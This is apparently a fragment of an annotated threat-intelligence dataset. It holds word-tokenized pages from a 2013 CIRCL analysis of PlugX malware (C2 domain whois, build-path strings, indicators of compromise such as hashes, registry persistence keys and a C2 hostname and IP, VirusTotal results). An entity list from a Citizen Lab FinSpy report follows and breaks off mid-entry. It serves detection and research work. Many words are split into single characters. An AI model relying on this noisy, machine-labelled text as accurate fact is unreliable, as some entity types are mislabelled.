"www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "mnt\u2212by", ":", "source", ":", "MNT\u2212KRNIC\u2212AP", "APNIC", "inetnum", ":", "netname", ":", "descr", ":", "country", ":", "admin\u2212c", ":", "tech\u2212c", ":", "status", ":", "mnt\u2212by", ":", "mnt\u2212i", "r", "t", ":", "remarks", ":", "remarks", ":", "remarks", ":", "changed", ":", "source", ":", "122.199.128.0", "\u2212", "122.199.255.255"], ["VAAN\u2212KR", "NexG", "KR", "LS151\u2212KR", "LS151\u2212KR", "ALLOCATED", "PORTABLE", "MNT\u2212KRNIC\u2212AP", "IRT\u2212KRNIC\u2212KR"], ["This", "i", "nformation", "has", "been", "p", "a", "r", "t", "i", "a", "l", "l", "y", "mirrored", "by", "APNIC", "from", "KRNIC", "."], ["To", "obtain", "more", "s", "p", "e", "c", "i", "f", "i", "c", "information", ",", "p", "l", "e", "a", "s", "e", "use", "the", "KRNIC", "whois", "s", "e", "r", "v", "e", "r", "at", "whois", "."], ["k", "r", "n", "i", "c", "."], ["net", "."], ["hostmaster@nic", "."], ["or", "."], ["kr"], ["KRNIC", "4.8.2", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"], ["17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "March", "29", ",", "2013", "Domain", "Domain", "Name", ":", "YAHOO\u2212UPGRADE.COM", "R", "e", "g"], ["i", "s", "t", "r", "a", "r", ":", "JIANGSU", "BANGNING", "SCIENCE", "&", "TECHNOLOGY", "CO", ".", "LTD", "Whois", "Server", ":", "whois", "."], ["5", "5", "h", "l", "."], ["com", "R", "e", "f", "e", "r", "r", "a", "l", "URL", ":", "http", ":", "/", "/www", "."], ["5", "5", "h", "l", "."], ["com", "Name", "Server", ":", "DNS5", ".", "4CUN.COM"], ["Name", "Server", ":", "DNS6", ".", "4CUN.COM"], ["Status", ":", "ok", "Updated", "Date", ":", "08\u2212aug\u22122012", "Creation", "Date", ":", "18\u2212", "j", "u", "l", "\u22122011", "Expiration", "Date", ":", "18\u2212j", "u", "l", "\u22122013", ">", ">", ">", "Last", "update", "o", "f", "whois", "database", ":", "We", "d", ",", "27", "Mar", "2013", "2", "2", ":", "3", "6", ":", "1", "3", "UTC", "<", "<", "<", "Domain", "Name", ":", "yahoo\u2212upgrade", ".", "com", "R", "e", "g", "i", "s", "t", "r", "a", "n", "t", "Contact", ":", "yahoo", "yahoo", "yahoo", "whiteyoo_123@yahoo", ".", "com", "telephone", ":"], ["+48.56756756756", "fax", ":", "+48.56732453453", "yahoo", "yahoo", "yahoo", "345345"], ["CA", "Administrative", "Contact", ":", "yahoo", "yahoo", "whiteyoo_123@yahoo", ".", "com", "telephone", ":"], ["+48.56756756756", "fax", ":", "+48.56732453453", "yahoo", "yahoo", "yahoo", "345345"], ["CA", "Technical", "Contact", ":", "yahoo", "yahoo", "whiteyoo_123@yahoo", ".", "com", "telephone", ":"], ["+48.56756756756", "fax", ":", "+48.56732453453", "yahoo", "yahoo", "yahoo", "345345"], ["CA", "B", "i", "l", "l", "i", "n", "g", "Contact", ":", "yahoo", "yahoo", "whiteyoo_123@yahoo", ".", "com", "telephone", ":"], ["+48.56756756756", "Page", "17", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "41", "fax", ":", "+48.56732453453", "42", "yahoo", "yahoo", "yahoo", "345345"], ["43", "CA", "4.9", "Current", "version", "and", "history", "of", "PlugX"], ["A", "version", "string", "can", "be", "found", "in", "this", "binary", ":", "1", "d", ":", "\\", "work\\", "plug7", "."], ["0"], ["(", "mcvsmap", ")", "(", "f", "k", "i", "n", "g", ")", "\u01f0", "(", ")", "\\", "s", "h", "e", "l", "l", "c", "o", "d", "e", "\\", "s"], ["h", "e", "l", "l", "c", "o", "d", "e", "\\XPlug", "."], ["h"], ["This", "could", "mean", "PlugX", ",", "version", "7.0", "codename", "fking", ",", "build", "for", "mcvsmap", "."], ["References", "can", "be", "found", "on", "the", "internet", "for", "previous", "versions", "of", "this", "malware", "family", ":", "1", "2", "3", "4", "d", ":", "\\", "work\\", "plug4", "."], ["0", "(", "nvsmart", ")", "(", "s", "x", "l", ")", "\\", "s", "h", "e", "l", "l", "c", "o", "d", "e", "\\", "s"], ["h", "e", "l", "l", "c", "o", "d", "e", "\\XPlug", "."], ["h", "d", ":", "\\", "work\\", "plug3", "."], ["1", "(", "icesword", ")", "\\", "s", "h", "e", "l", "l", "c", "o", "d", "e", "\\", "s"], ["h", "e", "l", "l", "c", "o", "d", "e", "\\XPlug", "."], ["h", "d", ":", "\\", "work\\Plug3", ".", "0"], ["(", "Gf", ")", "UDP\\", "S"], ["h", "e", "l", "l", "6", "\\", "Release", "\\", "S", "h", "e", "l", "l", "6", "."], ["pdb"], ["i", ":", "\\", "work\\", "plug2", ".", "0"], ["(", ")", "\\", "s", "h", "e", "l", "l", "c", "o", "d", "e", "\\", "s"], ["h", "e", "l", "l", "c", "o", "d", "e", "\\XPlug", "."], ["h", "A", "A.1", "Appendix", "Indicators", "of", "Compromise", "(", "IOC", ")"], ["This", "section", "summarizes", "the", "known", "indicators", "of", "compromise", "."], ["The", "list", "might", "not", "be", "exhaustive", ",", "but", "the", "existence", "of", "any", "or", "all", "of", "the", "following", "indicators", "might", "help", "to", "discover", "an", "infection", "."], ["A.1.1", "1", "2", "3", "Pipes", "\\PIPE\\a$PID", "\\PIPE\\b$PID", "\\PIPE\\RUN_AS_USER($PID", ")", "(", "where", "$", "PID", "is", "the", "process", "ID", "of", "the", "active", "malicious", "process", ")"], ["A.1.2", "Files", "and", "directories", "\u2022", "Static", "\ufb01les", "(", "dropped", "\ufb01les", ")", "\u2013", "update.exe", "1", "MD5", ":", "2", "SHA1", ":", "3", "SHA\u2212256", ":", "f1f48360f95e1b43e9fba0fec5a2afb8", "70", "ceb467db7b0161d22e4545479f747417b9705a", "2", "bc5ce39dd9afe2157448d3f6d8cb9c549ed39543d159616e38480b9e6c11c49", "\u2013", "mcvsmap.exe", "1", "MD5", ":", "2", "SHA1", ":", "3", "SHA\u2212256", ":", "4", "e1e0b8b0673937415599bf2f24c44ad", "9224", "de3af2a246011c6294f64f27206d165317ba", "ae16e10e621d6610a3f7f2c7122f9d1263700ba02d1b90e42798decb2fe84096", "\u2013"], ["McUtil", ".", "DLL", "1", "MD5", ":", "2", "SHA1", ":", "3", "SHA\u2212256", ":", "Page", "18", "of", "21", "ad4a646b38a482cc07d5b09b4fffd3b3", "ae0f9bf2740d00c5d485827eb32aca33feaa3a90", "0", "a99238e1ebebc47d7a89b2ccddfae537479f7f77322b5d4941315d3f7e5ca48", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE"], ["41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "\u2013", "McUtil", ".", "DLL.PPT", "1", "MD5", ":", "2", "SHA1", ":", "3", "SHA\u2212256", ":", "545", "bb4365a9b7cdb6d22844ebeedda93"], ["a267f1183b4ff843d68a63264846abf78cc71d1f", "d4fe890a08d4dd44b58a3b85b2a7e89536338099c1c42a9b7e85f4007b0a37b7", "\u2013", "UAC.TMP", "1", "MD5", ":", "2", "SHA1", ":", "3", "SHA\u2212256", ":", "52", "df5c2c07433e2a8f054c2347acb3b4", "8051474", "c1fc0d8f404a42ea32eca1699e54f02e1", "dc09091e5d0ce03c6144748f17bd636f2f0b2ca56f88b550c1d48860596dbdb1", "Files", "and/or", "directories", "might", "be", "hidden", "and", "carry", "the", "system", "\ufb02ag", "1", "2", "3", "4", "5", "C", ":", "\\", "ProgramData\\VirusMap", "(", "Windows", "7", ")", "C", ":", "\\", "Users", "\\", "A", "l", "l", "Users", "\\VirusMap", "(", "Windows", "7", ")", "C", ":", "\\", "Documents", "and", "S", "e", "t", "t", "i", "n", "g", "s", "\\", "A", "l", "l", "Users", "\\VirusMap", "(", "Windows", "XP", ")", "%", "ALLUSERSPROFILE%\\SxS\\bug", ".", "l", "o", "g", "C", ":", "\\", "Documents", "and", "S", "e", "t", "t", "i", "n", "g", "s", "\\", "A", "l", "l", "Users", "\\VirusMap\\NvSmart", ".", "hlp", "A.1.3", "Registry", "1", "HKEY_LOCAL_MACHINE\\SYSTEM\\", "ControlSet001", "\\", "S", "e", "r", "v", "i", "c", "e", "s", "\\VirusMap", "and", "a", "key", "r", "e", "f", "e", "r", "e", "n", "c", "i", "n", "g", "Sample", "B", "2", "HKEY_CURRENT_USER\\", "Software", "\\", "M", "i", "c", "r", "o", "s", "o", "f", "t", "\\Windows\\", "CurrentVersion", "\\Run", "and", "a", "key", "r", "e", "f", "e", "r", "e", "n", "c", "i", "n", "g", "Sample", "B", "A.1.4", "Network", "(", "hostname", "and", "destination", "IP", "addresses", ")", "1", "help", ".", "yahoo\u2212upgrade", ".", "com", "2", "122.199.194.197", "A.2", "References", "\u2022", "WHITE", "PAPER", ":", "PLUG", "X", "-", "PAYLOAD", "EXTRACTION", "\u2013", "http://www.contextis.com/files/PlugX_-_Payload_Extraction_March_2013_1", "."], ["pdf", "\u2013", "Context", "Information", "Security", "-", "http://www.contextis.com/", "\u2013"], ["Published", "2013", "-", "03", "-", "22", "\u2022"], ["An", "Analysis", "of", "PlugX", "\u2013", "http://lastline.com/blog.php", "\u2013", "Lastline", "-", "http://www.lastline.com/", "\u2013", "no", "publication", "date", "found", "\u2022"], ["PlugX", "is", "becoming", "mature", "\u2013", "http://www.securelist.com/en/blog/208193974/PlugX_is_becoming_mature"], ["\u2013", "Kaspersky", "Lab", "-", "http://www.kaspersky.com/"], ["Page", "19", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "\u2013", "Published", "2012", "-", "11", "-", "27"], ["\u2022"], ["Unplugging", "PlugX", "Capabilities", "\u2013", "http://blog.trendmicro.com/trendlabs-security-intelligence/unplugging-plugx-capabilities", "\u2013", "TrendMicro", "-", "http://www.trendmicro.eu/"], ["\u2013"], ["Published", "2012", "-", "09", "-", "17", "\u2022"], ["Tracking", "down", "the", "author", "of", "the", "PlugX", "RAT", "\u2013", "http://labs.alienvault.com/labs/index.php/2012/tracking-down-the-author-of-the-plugx-rat"], ["\u2013", "AlienVault", "-", "http://labs.alienvault.com", "\u2013"], ["Published", "2012", "-", "09", "-", "13", "A.3", "VirusTotal", "results", "\u2022", "Sample", "A", "1", "2"], ["3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"], ["17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "MicroWorld\u2212eScan", ":", "Trojan", "."], ["Agent", ".AZDK"], ["nProtect", ":"], ["Trojan", "."], ["Agent", ".AZDK"], ["McAfee", ":", "RDN/", "Generic", "BackDoor", "!", "gq", "Malwarebytes", ":", "Trojan", "."], ["Dropper", ".CH"], ["Symantec", ":", "WS", "."], ["Reputation", "."], ["1"], ["Norman", ":", "Agent", "."], ["APIJH"], ["TrendMicro\u2212HouseCall", ":", "BKDR_POISON.PQ"], ["Avast", ":"], ["Win32", ":", "Gulpix\u2212B"], ["[", "Trj", "]", "Kaspersky", ":"], ["Backdoor", "."], ["Win32", "."], ["Gulpix", "."], ["bo"], ["BitDefender", ":", "Trojan", "."], ["Agent", ".AZDK"], ["Agnitum", ":", "Backdoor", "."], ["Gulpix", "!"], ["EFaRR6zLtc4"], ["ViRobot", ":", "Backdoor", "."], ["Win32", ".A."], ["Gulpix", "."], ["3", "7", "0", "7", "0", "2", ".B"], ["Comodo", ":", "UnclassifiedMalware", "F\u2212Secure", ":", "Trojan", "."], ["Agent", ".AZDK"], ["DrWeb", ":", "Trojan", "."], ["Click2"], [".52215"], ["VIPRE", ":", "Trojan", "."], ["Win32", "."], ["Generic", "!"], ["BT"], ["AntiVir", ":", "TR", "/", "Agent", "."], ["azdk", "."], ["3", "TrendMicro", ":", "BKDR_POISON.PQ", "McAfee\u2212GW\u2212Edition", ":", "RDN/", "Generic", "BackDoor", "!", "gq", "Sophos", ":"], ["Troj", "/Agent\u2212AATT"], ["Kingsoft", ":"], ["Win32", "."], ["Hack", "."], ["Gulpix", "."], ["(", "kcloud", ")"], ["Microsoft", ":"], ["Backdoor", ":", "Win32", "/", "Plugx", ".A"], ["GData", ":", "Trojan", "."], ["Agent", ".AZDK"], ["AhnLab\u2212V3", ":", "Backdoor", "/", "Win32", "."], ["Gulpix"], ["I", "karu", "s", ":"], ["Backdoor", "."], ["Win32", "."], ["Gulpix", "Fortinet", ":", "W32", "/", "Gulpix", ".BO", "!"], ["t", "r", "."], ["bdr"], ["AVG", ":", "Agent4"], [".AKAP"], ["Panda", ":"], ["Trj", "/CI", ".A"], ["Scanned", ":", "2013\u221203\u221221", "0", "4", ":", "0", "1", ":", "1", "2", "\u2212", "45", "scans", "\u2212"], ["28", "d", "e", "t", "e", "c", "t", "i", "o", "n", "s", "(", "62.0", "%", ")", "\u2022", "Sample", "B", "(", "mcvsmap.exe", ")", "1", "Scanned", ":", "2013\u221203\u221221", "1", "3", ":", "2", "9", ":", "4", "5", "\u2212", "44", "scans"], ["\u2212"], ["0"], ["d", "e", "t", "e", "c", "t", "i", "o", "n", "s", "(", "0.0", "%", ")", "\u2022", "Sample", "C"], ["(", "McUtil", ".", "DLL", ")"], ["Page", "20", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg"], ["c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"], ["17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "March", "29", ",", "2013", "MicroWorld\u2212eScan", ":", "Trojan", "."], ["Agent", ".AZDK"], ["nProtect", ":"], ["Trojan", "."], ["Agent", ".AZDK"], ["McAfee", ":", "RDN/", "Generic", "BackDoor", "!"], ["gt"], ["Malwarebytes", ":", "Backdoor", "."], ["Gulpix", "Symantec", ":", "WS", "."], ["Reputation", "."], ["1"], ["Norman", ":", "Agent", "."], ["APIJH"], ["TrendMicro\u2212HouseCall", ":", "TROJ_GEN.RCBCRCJ"], ["Avast", ":", "Win32", ":", "Gulpix\u2212B"], ["[", "Trj", "]", "Kaspersky", ":"], ["Backdoor", "."], ["Win32", "."], ["Gulpix", "."], ["bo"], ["BitDefender", ":", "Trojan", "."], ["Agent", ".AZDK"], ["Agnitum", ":", "Backdoor", "."], ["Gulpix", "!"], ["EFaRR6zLtc4"], ["Comodo", ":", "UnclassifiedMalware", "F\u2212Secure", ":", "Trojan", "."], ["Agent", ".AZDK"], ["DrWeb", ":", "Trojan", "."], ["Click2"], [".52215"], ["VIPRE", ":", "Trojan", "."], ["Win32", "."], ["Generic", "!"], ["BT"], ["AntiVir", ":", "TR", "/", "Agent", "."], ["azdk", "."], ["2", "TrendMicro", ":", "TROJ_GEN.RCBCRCJ", "McAfee\u2212GW\u2212Edition", ":", "RDN/", "Generic", "BackDoor", "!"], ["gt"], ["Sophos", ":"], ["Troj", "/Agent\u2212AATT"], ["Microsoft", ":"], ["Backdoor", ":", "Win32", "/", "Plugx", ".A"], ["GData", ":", "Trojan", "."], ["Agent", ".AZDK"], ["Commtouch", ":", "W32", "/", "Backdoor", "."], ["IYCB\u22125867"], ["I", "karu", "s", ":"], ["Backdoor", "."], ["Win32", "."], ["Gulpix", "Fortinet", ":", "W32", "/", "Gulpix", ".BO", "!"], ["t", "r", "."], ["bdr"], ["AVG", ":", "Agent4"], [".AKAP"], ["Panda", ":"], ["Trj", "/CI", ".A"], ["Scanned", ":", "2013\u221203\u221221", "1", "3", ":", "4", "6", ":", "1", "0", "\u2212", "44", "scans", "\u2212"], ["26", "d", "e", "t", "e", "c", "t", "i", "o", "n", "s", "(", "59.0", "%", ")", "\u2022", "Sample", "D"], ["(", "McUtil", ".", "DLL.PPT", ")"], ["1", "Not", "uploaded", "to", "VirusTotal", "."], ["\u2022", "Sample", "E", "1", "Not", "uploaded", "to", "VirusTotal", "."], ["\u2022", "Sample", "F", "(", "UAC.TMP", ")", "1", "Panda", ":"], ["Suspicious", "f", "i", "l", "e", "2", "Scanned", ":", "2012\u221209\u221220", "0", "2", ":", "3", "3", ":", "5", "5", "\u2212", "43", "scans", "\u2212", "1", "d", "e", "t", "e", "c", "t", "i", "o", "n", "s", "(", "2.0", "%", ")", "Page", "21", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu"]]}, {"vertexSet": [[{"name": "March 2013", "pos": [5, 7], "sent_id": 0, "type": "Time"}], [{"name": "The Citizen Lab", "pos": [7, 10], "sent_id": 0, "type": "Organization"}], [{"name": "FinFisher", "pos": [9, 10], "sent_id": 3, "type": "Malware"}], [{"name": "Ethiopia", "pos": [11, 12], "sent_id": 3, "type": "ExploitTargetObject"}], [{"name": "FinSpy Mobile", "pos": [7, 9], "sent_id": 4, "type": "Malware"}], [{"name": "Vietnam", "pos": [22, 23], "sent_id": 4, "type": "ExploitTargetObject"}], [{"name": "Australia", "pos": [14, 15], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Bahrain", "pos": [16, 17], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Bangladesh", "pos": [18, 19], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Brunei", "pos": [20, 21], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Canada", "pos": [22, 23], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Czech Republic", "pos": [24, 26], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Estonia", "pos": [27, 28], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Ethiopia", "pos": [29, 30], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Germany", "pos": [31, 32], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [33, 34], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Indonesia", "pos": [35, 36], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Japan", "pos": [37, 38], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Latvia", "pos": [39, 40], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Malaysia", "pos": [41, 42], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Mexico", "pos": [43, 44], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Mongolia", "pos": [45, 46], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Netherlands", "pos": [47, 48], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Qatar", "pos": [49, 50], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Serbia", "pos": [51, 52], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Singapore", "pos": [53, 54], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Turkmenistan", "pos": [55, 56], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "United Arab Emirates", "pos": [57, 60], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "United Kingdom", "pos": [61, 63], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "United States", "pos": [64, 66], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "Vietnam", "pos": [67, 68], "sent_id": 8, "type": "ExploitTargetObject"}], [{"name": "FinSpy", "pos": [2, 3], "sent_id": 9, "type": "Campaign"}], [{"name": "Ethiopia", "pos": [5, 6], "sent_id": 9, "type": "ExploitTargetObject"}], [{"name": "Ginbot 7", "pos": [9, 11], "sent_id": 9, "type": "ExploitTargetObject"}], [{"name": "FinSpy Mobile", "pos": [7, 9], "sent_id": 12, "type": "Campaign"}], [{"name": "Android FinSpy Mobile", "pos": [3, 6], "sent_id": 13, "type": "Malware"}], [{"name": "Vietnam", "pos": [17, 18], "sent_id": 13, "type": "ExploitTargetObject"}], [{"name": "Gamma International", "pos": [8, 10], "sent_id": 14, "type": "Organization"}], [{"name": "FinFisher", "pos": [0, 1], "sent_id": 17, "type": "Malware"}], [{"name": "Munich", "pos": [12, 13], "sent_id": 17, "type": "Location"}], [{"name": "Gamma International GmbH", "pos": [15, 18], "sent_id": 17, "type": "Organization"}], [{"name": "July 2012", "pos": [2, 4], "sent_id": 19, "type": "Time"}], [{"name": "Bahraini activists", "pos": [20, 22], "sent_id": 19, "type": "ExploitTargetObject"}], [{"name": "FinSpy", "pos": [32, 33], "sent_id": 19, "type": "Malware"}], [{"name": "FinSpy", "pos": [0, 1], "sent_id": 21, "type": "Campaign"}], [{"name": "passwords", "pos": [10, 11], "sent_id": 21, "type": "SystemInformation"}], [{"name": "Skype calls", "pos": [12, 14], "sent_id": 21, "type": "TechnologyInformation"}], [{"name": "Bahrain", "pos": [13, 14], "sent_id": 22, "type": "Location"}], [{"name": "FinFisher", "pos": [16, 17], "sent_id": 23, "type": "Malware"}], [{"name": "Claudio Guarnieri", "pos": [0, 2], "sent_id": 24, "type": "Person"}], [{"name": "Rapid7", "pos": [3, 4], "sent_id": 24, "type": "Organization"}], [{"name": "Rapid7", "pos": [0, 1], "sent_id": 26, "type": "Organization"}], [{"name": "CrowdStrike", "pos": [4, 5], "sent_id": 27, "type": "Organization"}], [{"name": "SpiderLabs", "pos": [6, 7], "sent_id": 27, "type": "Organization"}], [{"name": "FinSpy", "pos": [13, 14], "sent_id": 27, "type": "Campaign"}], [{"name": "Rapid7", "pos": [14, 15], "sent_id": 28, "type": "Organization"}], [{"name": "Turkmenistan", "pos": [16, 17], "sent_id": 30, "type": "Country"}], [{"name": "August 2012", "pos": [8, 10], "sent_id": 31, "type": "Location"}], [{"name": "October 2012", "pos": [7, 9], "sent_id": 32, "type": "Location"}], [{"name": "Turkmenistan", "pos": [23, 24], "sent_id": 35, "type": "Campaign"}], [{"name": "Bahrain", "pos": [25, 26], "sent_id": 35, "type": "Campaign"}], [{"name": "August 2012", "pos": [2, 4], "sent_id": 36, "type": "Time"}], [{"name": "NGO Privacy International", "pos": [12, 15], "sent_id": 36, "type": "Organization"}], [{"name": "European Centre for Constitutional and Human Rights", "pos": [8, 15], "sent_id": 40, "type": "Organization"}], [{"name": "ECCHR", "pos": [16, 17], "sent_id": 40, "type": "Organization"}], [{"name": "Bahrain Center for Human Rights", "pos": [20, 25], "sent_id": 40, "type": "Organization"}], [{"name": "Bahrain Watch", "pos": [26, 28], "sent_id": 40, "type": "Organization"}], [{"name": "Reporters Without Borders", "pos": [30, 33], "sent_id": 40, "type": "Organization"}], [{"name": "Organization for Economic Cooperation and Development", "pos": [38, 44], "sent_id": 40, "type": "Organization"}], [{"name": "OECD", "pos": [45, 46], "sent_id": 40, "type": "Organization"}], [{"name": "Gamma", "pos": [54, 55], "sent_id": 40, "type": "Organization"}], [{"name": "FinSpy", "pos": [22, 23], "sent_id": 42, "type": "Malware"}], [{"name": "Bahrain", "pos": [26, 27], "sent_id": 42, "type": "Campaign"}], [{"name": "FinFisher", "pos": [14, 15], "sent_id": 46, "type": "Campaign"}], [{"name": "FinSpy", "pos": [21, 22], "sent_id": 47, "type": "Campaign"}], [{"name": "Ethiopia", "pos": [37, 38], "sent_id": 47, "type": "ExploitTargetObject"}], [{"name": "Vietnam", "pos": [39, 40], "sent_id": 47, "type": "ExploitTargetObject"}], [{"name": "October 2012", "pos": [6, 8], "sent_id": 50, "type": "Time"}], [{"name": "FinSpy", "pos": [15, 16], "sent_id": 50, "type": "Campaign"}], [{"name": "FinSpy", "pos": [15, 16], "sent_id": 51, "type": "Campaign"}], [{"name": "FinSpy", "pos": [11, 12], "sent_id": 52, "type": "Campaign"}], [{"name": "FinSpy", "pos": [8, 9], "sent_id": 53, "type": "Campaign"}], [{"name": "FinSpy", "pos": [27, 28], "sent_id": 53, "type": "Campaign"}], [{"name": "FinSpy", "pos": [8, 9], "sent_id": 55, "type": "Campaign"}], [{"name": "Canada", "pos": [2, 3], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "Bangladesh", "pos": [4, 5], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [6, 7], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "Malaysia", "pos": [8, 9], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "Mexico", "pos": [10, 11], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "Serbia", "pos": [12, 13], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "Vietnam", "pos": [14, 15], "sent_id": 58, "type": "ExploitTargetObject"}], [{"name": "Brunei", "pos": [15, 16], "sent_id": 63, "type": "ExploitTargetObject"}], [{"name": "UAE", "pos": [17, 18], "sent_id": 63, "type": "ExploitTargetObject"}], [{"name": "Latvia", "pos": [19, 20], "sent_id": 63, "type": "ExploitTargetObject"}], [{"name": "Mongolia", "pos": [22, 23], "sent_id": 63, "type": "ExploitTargetObject"}], [{"name": "FinSpy", "pos": [3, 4], "sent_id": 64, "type": "Campaign"}], [{"name": "Australia", "pos": [0, 1], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Bahrain", "pos": [2, 3], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Bangladesh", "pos": [4, 5], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Brunei", "pos": [6, 7], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Canada", "pos": [8, 9], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Czech Republic", "pos": [10, 12], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Estonia", "pos": [13, 14], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Ethiopia", "pos": [15, 16], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Germany", "pos": [17, 18], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [19, 20], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Indonesia", "pos": [21, 22], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Japan", "pos": [23, 24], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Latvia", "pos": [25, 26], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Malaysia", "pos": [27, 28], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Mexico", "pos": [29, 30], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Mongolia", "pos": [31, 32], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Netherlands", "pos": [33, 34], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Qatar", "pos": [35, 36], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Serbia", "pos": [37, 38], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Singapore", "pos": [39, 40], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Turkmenistan", "pos": [41, 42], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "United Arab Emirates", "pos": [43, 46], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "United Kingdom", "pos": [47, 49], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "United States", "pos": [50, 52], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "Vietnam", "pos": [53, 54], "sent_id": 65, "type": "ExploitTargetObject"}], [{"name": "FinSpy", "pos": [20, 21], "sent_id": 66, "type": "Campaign"}], [{"name": "FinSpy", "pos": [5, 6], "sent_id": 67, "type": "Campaign"}], [{"name": "FinFisher", "pos": [24, 25], "sent_id": 67, "type": "Malware"}], [{"name": "FinSpy", "pos": [5, 6], "sent_id": 69, "type": "Campaign"}], [{"name": "117.121.xxx.xxx", "pos": [5, 6], "sent_id": 73, "type": "Address"}], [{"name": "Australia", "pos": [7, 8], "sent_id": 73, "type": "Country"}], [{"name": "77.69.181.162", "pos": [8, 9], "sent_id": 73, "type": "Address"}], [{"name": "Bahrain", "pos": [3, 4], "sent_id": 74, "type": "Country"}], [{"name": "180.211.xxx.xxx", "pos": [4, 5], "sent_id": 74, "type": 